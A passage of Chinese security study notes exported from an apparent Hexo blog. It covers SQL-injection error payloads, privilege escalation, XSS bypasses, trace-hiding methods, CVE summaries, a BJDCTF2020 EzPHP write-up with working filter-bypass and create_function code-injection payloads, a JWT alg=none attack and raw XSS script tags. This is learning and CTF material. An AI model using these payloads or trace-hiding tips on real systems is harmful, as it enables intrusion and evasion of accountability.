<p>and extractvalue(1,concat(0x7e,(select database())))</p>
<p>(2) updatexml</p>
<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p>
<h3 id="问：UDF提权原理"><a href="#问：UDF提权原理" class="headerlink" title="问：UDF提权原理"></a>问：UDF提权原理</h3><p>答：利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd</p>
<h3 id="问：提权方式"><a href="#问：提权方式" class="headerlink" title="问：提权方式"></a>问：提权方式</h3><p>答：</p>
<p>windows:</p>
<blockquote>
<p> 1.systminfo ,根据系统补丁提权</p>
<p> 2.第三方服务提权</p>
<p> 3.数据库提权</p>
<p> 。。。</p>
</blockquote>
<p>linux:</p>
<blockquote>
<p> 1.利用系统内核漏洞进行提权 </p>
<p> 2.泄漏密码提权</p>
<p> 3.sudo提权</p>
<p> 4.SUID提权</p>
<p> 。。。</p>
</blockquote>
<h3 id="问：XSS弹窗函数及常见的-XSS-绕过策略"><a href="#问：XSS弹窗函数及常见的-XSS-绕过策略" class="headerlink" title="问：XSS弹窗函数及常见的 XSS 绕过策略"></a><strong>问：XSS弹窗函数及常见的 XSS 绕过策略</strong></h3><p>答：</p>
<p>一、alert,confirm,prompt三种函数</p>
<p>二、绕过策略</p>
<blockquote>
<p> \1. 大小写混合</p>
<p> \2. 双写</p>
<p> 3.编码</p>
<p> \4. fuzz 低频使用标签 &lt;details/open/ontoggle&gt;</p>
<p> \5. fuzz 低频使用函数 ontoggle 等</p>
<p> 6.&lt;img/src=1&gt;</p>
<p> 7.%0a或者%0d绕过</p>
</blockquote>
<h3 id="问：Windows-cmd-如何下载文件"><a href="#问：Windows-cmd-如何下载文件" class="headerlink" title="问：Windows cmd 如何下载文件"></a>问：Windows cmd 如何下载文件</h3><p>答：</p>
<blockquote>
<p> 1.certutil.exe</p>
<p> 2.powershell</p>
<p> 3.bitsadmin</p>
<p> 4.vbs</p>
<p> 5.ftp</p>
</blockquote>
<h3 id="问：SVN-GIT源代码泄露"><a href="#问：SVN-GIT源代码泄露" class="headerlink" title="问：SVN/GIT源代码泄露"></a><strong>问：SVN/GIT源代码泄露</strong></h3><p>答：</p>
<blockquote>
<p> （1）在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息</p>
<p> /.git/config</p>
<p> （2）使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞</p>
<p> /.svn/entries</p>
</blockquote>
<h3 id="问：reverse-tcp-和-bind-tcp-的区别"><a href="#问：reverse-tcp-和-bind-tcp-的区别" class="headerlink" title="问：reverse_tcp 和 bind_tcp 的区别"></a>问：reverse_tcp 和 bind_tcp 的区别</h3><p>答：</p>
<p>（1）reverse_tcp</p>
<p>木马会主动连接目标服务器</p>
<p>（2）bind_tcp</p>
<p>木马会监听本地的端口</p>
<h3 id="什么是fastjson-有哪些漏洞？"><a href="#什么是fastjson-有哪些漏洞？" class="headerlink" title="什么是fastjson,有哪些漏洞？"></a>什么是fastjson,有哪些漏洞？</h3><p>答：</p>
<p>（1）Fastjson是Alibaba开发的Java语言编写的高性能JSON库</p>
<p>（2）攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE</p>
<p>（3）fastjson漏洞历史</p>
<p>1.fastjson-1.2.24</p>
<p>(fastjson接受的JSON可以通过艾特type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)</p>
<p>2.fastjson-1.248以下</p>
<p>(checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)</p>
<p>3.fastjson-1.2.60以下</p>
<p>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p>
<h3 id="问：隐藏攻击痕迹的方法"><a href="#问：隐藏攻击痕迹的方法" class="headerlink" title="问：隐藏攻击痕迹的方法"></a>问：隐藏攻击痕迹的方法</h3><p>答：</p>
<blockquote>
<p> 1.跳板</p>
<p> 2.代理服务器</p>
<p> 3.Tor</p>
<p> 4.日志</p>
<p> 5.清除历史记录</p>
<p> 6.粉碎文件</p>
</blockquote>
<h2 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h2><p>讲诉一些近期及有代表性的漏洞</p>
<h3 id="Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688"><a href="#Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688" class="headerlink" title="Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)"></a>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)</h3><p>该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey</p>
<h3 id="Apache-Tomcat-文件包含漏洞-CVE-2020-1938"><a href="#Apache-Tomcat-文件包含漏洞-CVE-2020-1938" class="headerlink" title="Apache Tomcat 文件包含漏洞(CVE-2020-1938)"></a>Apache Tomcat 文件包含漏洞(CVE-2020-1938)</h3><p>默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)</p>
<h3 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h3><p>weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击</p>
<h3 id="Apache-Solr远程代码执行（CVE-2019-12409）"><a href="#Apache-Solr远程代码执行（CVE-2019-12409）" class="headerlink" title="Apache Solr远程代码执行（CVE-2019-12409）"></a>Apache Solr远程代码执行（CVE-2019-12409）</h3><p>默认配置文件solr.in.sh,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMX RMI远程代码执行</p>
<h3 id="SHIRO-550-反序列化漏洞"><a href="#SHIRO-550-反序列化漏洞" class="headerlink" title="SHIRO-550 反序列化漏洞"></a>SHIRO-550 反序列化漏洞</h3><p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p>
<p>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化</p>
<p>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞</p>
<h3 id="SHIRO-721反序列化漏洞"><a href="#SHIRO-721反序列化漏洞" class="headerlink" title="SHIRO-721反序列化漏洞"></a>SHIRO-721反序列化漏洞</h3><p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击</p>
<h3 id="泛微Ecology-OA-SQL注入漏洞"><a href="#泛微Ecology-OA-SQL注入漏洞" class="headerlink" title="泛微Ecology OA SQL注入漏洞"></a>泛微Ecology OA SQL注入漏洞</h3><p>validate.jsp接口的SQL注入，/cpt/manage/validate.jsp</p>
<h3 id="泛微ecology-OA系统接口存在数据库配置信息泄露"><a href="#泛微ecology-OA系统接口存在数据库配置信息泄露" class="headerlink" title="泛微ecology OA系统接口存在数据库配置信息泄露"></a>泛微ecology OA系统接口存在数据库配置信息泄露</h3><p>/mobile/dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密</p>
<h3 id="Confluence本地文件泄露漏洞-CVE-2019-3394"><a href="#Confluence本地文件泄露漏洞-CVE-2019-3394" class="headerlink" title="Confluence本地文件泄露漏洞(CVE-2019-3394)"></a>Confluence本地文件泄露漏洞(CVE-2019-3394)</h3><p>catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在/WEB-INF下</p>
<h3 id="Apache-Dubbo反序列化漏洞（CVE-2019-17564）"><a href="#Apache-Dubbo反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Apache Dubbo反序列化漏洞（CVE-2019-17564）"></a>Apache Dubbo反序列化漏洞（CVE-2019-17564）</h3><p>当HTTP remoting 开启的时候，存在反序列化漏洞</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录</title>
    <url>/2020/07/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>​    点开后，右键查看代码，发现有个base32加密的，解密后是1nD3x.php页面提示，进入查看源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<h3 id="url编码绕过对-SERVER-‘QUERY-STRING’-的过滤"><a href="#url编码绕过对-SERVER-‘QUERY-STRING’-的过滤" class="headerlink" title="url编码绕过对$_SERVER[‘QUERY_STRING’]的过滤"></a>url编码绕过对$_SERVER[‘QUERY_STRING’]的过滤</h3><p>看到第一处过滤使用 preg_match 过滤了很多关键词，但是他是用 $_SERVER[‘QUERY_STRING’] 来获得查询语句的，不会进行解码，可以进行url编码绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (    preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对preg-match中-xxx-类型匹配的绕过"><a href="#对preg-match中-xxx-类型匹配的绕过" class="headerlink" title="对preg_match中/^xxx$/类型匹配的绕过"></a>对preg_match中/^xxx$/类型匹配的绕过</h3><p>第二处可以通过在句尾加上%0a进行绕过 </p>
<p>因为 preg_match 只匹配第一行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="绕过-REQUEST中数据检测"><a href="#绕过-REQUEST中数据检测" class="headerlink" title="绕过$_REQUEST中数据检测"></a>绕过$_REQUEST中数据检测</h3><p>第三处检测是检测数据中是否有字母</p>
<p>$_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值。 </p>
<p> 只需要同时GET和POST同一个参数就可以绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="file-get-contents进行比较内容"><a href="#file-get-contents进行比较内容" class="headerlink" title="file_get_contents进行比较内容"></a>file_get_contents进行比较内容</h3><p>第四处检测是检测 得到的$file中的文件内容是否是’debu_debu_aqua’</p>
<p>一般来说可以用php://input或data://<br>php://input是将post过来的数据全部当做文件内容<br>data://有以下几种用法<br>    data://text/plain,<?php phpinfo()?><br>    data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>
<p>这里用 file=data:text/plain,debu_debu_aqua 进行绕过检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="绕过sha1比较"><a href="#绕过sha1比较" class="headerlink" title="绕过sha1比较"></a>绕过sha1比较</h3><p>第五处检测绕过</p>
<p>sha1()函数是无法处理数组的，如果sha1()的参数为一个数组会报Warning并返回False</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h3><p>最后一处检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>$arg和$code变量都是可控的，因为extract()函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要extract()内的数组键名为arg和code，键值为我们构造的用来注入的代码，即可实现$arg和$code的变量覆盖，导致代码注入。</p>
<p> create_function() </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$myfunc = create_function(<span class="string">'$a, $b'</span>, <span class="string">'return $a+$b;'</span>);</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果第二个参数没有限制，可以构造下面的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">'$a, $b'</span>, <span class="string">'return($a+$b);&#125;eval($_POST["a"]);\\'</span>)</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">($a, $b)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> $a+$b; &#125; </span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>结合上面的extract()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;flag[arg]=&#125;a();//&amp;flag[code]=create_function</span><br></pre></td></tr></table></figure>

<h3 id="get-defined-vars-输出所有变量的值"><a href="#get-defined-vars-输出所有变量的值" class="headerlink" title="get_defined_vars()输出所有变量的值"></a>get_defined_vars()输出所有变量的值</h3><p>方法一</p>
<p>过滤了include 还能用require<br>过滤了引号，可以使用那些参数可以不加引号的函数，require()代替require “ “<br>过滤了flag，可以base64编码。其他过滤的不用便是</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(base64_decode(MWZsYWcucGhw));</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<p>正则匹配了&amp;和|导致无法与运算和或运算，但是可以^异或和~按位取反</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;%66%6c%61%67[arg]=&#125;require(%ce%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff);var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>

<p>其中，%ce%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff 这个异或运算的结果就是1flag.php</p>
<p>生成异或表达式脚本呢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"1 f l a g . p h p"</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $flag);</span><br><span class="line"></span><br><span class="line">foreach ($arr as $key =&gt; $value) &#123;</span><br><span class="line">	echo <span class="string">"%"</span>.dechex(ord($value)^<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">"^"</span>;</span><br><span class="line">foreach ($arr as $key =&gt; $value) &#123;</span><br><span class="line">	echo <span class="string">"%ff"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法三</p>
<p>取反+伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>

<p>关键代码取反</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=1flag.php</span><br></pre></td></tr></table></figure>

<p>生成脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">"p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p"</span>;</span><br><span class="line">$arr1 = explode(<span class="string">' '</span>, $a);</span><br><span class="line">echo <span class="string">"&lt;br&gt;~("</span>;</span><br><span class="line">foreach ($arr1 as $key =&gt; $value) &#123;</span><br><span class="line">	echo <span class="string">"%"</span>.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">")&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>系统命令学习</title>
    <url>/2020/07/13/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><a href="https://cjm00n.top/Linux/system-command-learning.html" target="_blank" rel="noopener">系统命令学习</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>linux基础命令学习</title>
    <url>/2020/07/13/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><a href="https://cjm00n.top/Linux/linux-command-learning.html" target="_blank" rel="noopener">linux基础命令学习</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Linux下的提权</title>
    <url>/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="Linux下用SUID提权"><a href="#Linux下用SUID提权" class="headerlink" title="Linux下用SUID提权"></a>Linux下用SUID提权</h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux下用SUID提权</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>CRLF Injection</title>
    <url>/2020/06/14/CRLF-Injection/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">CRLF Injection漏洞的利用与实例分析</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>JWT令牌攻击</title>
    <url>/2020/06/13/JWT%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="博客讲解："><a href="#博客讲解：" class="headerlink" title="博客讲解："></a>博客讲解：</h3><blockquote>
<p>关于jwt的讲解： <a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a><br><a href="https://www.cnblogs.com/z-sm/p/9125995.html" target="_blank" rel="noopener">https://www.cnblogs.com/z-sm/p/9125995.html</a><br><a href="https://www.jianshu.com/p/1ce08a374bb5" target="_blank" rel="noopener">https://www.jianshu.com/p/1ce08a374bb5</a><br>jwt攻击手段：<a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/181261.html</a></p>
<p><a href="https://www.cnblogs.com/karsa/p/12762297.html" target="_blank" rel="noopener">刷题EasyLogin</a></p>
</blockquote><a id="more"></a>
<p> 形式：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.（这里有一个点）eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.（这里也有一个点）TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ<br>第一个点前为header，第二个点前为payload，第二个点后为signture<br>一个攻击点：当header中的alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。 </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>SSI注入漏洞</title>
    <url>/2020/05/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">SSI注入漏洞</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>CTF XSS</title>
    <url>/2020/05/13/CTF-XSS/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/12207467.html" target="_blank" rel="noopener">CTF XSS</a><br><a href="https://www.freebuf.com/articles/web/244253.html" target="_blank" rel="noopener">XSS Challenges通关和Beef介绍</a></p><blockquote>
<p>1:没有过滤,直接用标签即可 </p>
<script>alert(document.domain);</script>

<p>2:闭合标签,再引入script<br>11111”&gt;<script>alert(document.domain);</script><br>#或者闭合前边引号,引入事件<br>“ onmouseover=alert(document.domain)&gt; </p>
</blockquote>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>CTF XXE</title>
    <url>/2020/05/13/CTF-XXE/</url>
